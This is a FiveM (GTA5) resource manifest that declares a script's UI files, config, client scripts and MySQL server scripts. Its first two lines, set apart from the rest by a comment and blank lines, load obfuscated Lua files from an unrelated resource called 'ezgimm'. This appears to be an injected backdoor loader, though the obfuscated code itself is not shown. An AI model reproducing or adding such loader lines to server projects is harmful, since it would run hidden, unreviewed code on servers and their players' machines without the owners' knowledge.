shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 
 
 

fx_version "cerulean"
game "gta5"

lua54 "yes"

ui_page "ui/build/index.html"

files {
	"ui/build/**.*",
}

escrow_ignore {
	"config.lua",
	"discordConfig.lua",
	"client/functions/progressbar.lua",
	"client/functions/skillCheck.lua",
	"client/functions/setVehicleProperties.lua",
	"client/functions/getVehicleProperties.lua",
	"client/main.lua",
	"languages/*.lua"
}

shared_scripts {
	"config.lua",
	"shared/**.lua",
}

client_scripts {
	"languages/*.lua",
	"client/**.lua",
	"coreExport.lua"
}

-- mysql
server_scripts {
	"@async/async.lua",
	"@mysql-async/lib/MySQL.lua",
	"discordConfig.lua",
	"server/**.lua",
	"coreExport.lua",
}

--[[
-- oxmysql (https://tgiann.gitbook.io/tgiann/main/convert-fxmanifest.lua-for-oxmysql)
server_scripts {
	"@oxmysql/lib/MySQL.lua",
	"discordConfig.lua",
	"server/**.lua",
	"coreExport.lua"
}
]]

dependency '/assetpacks'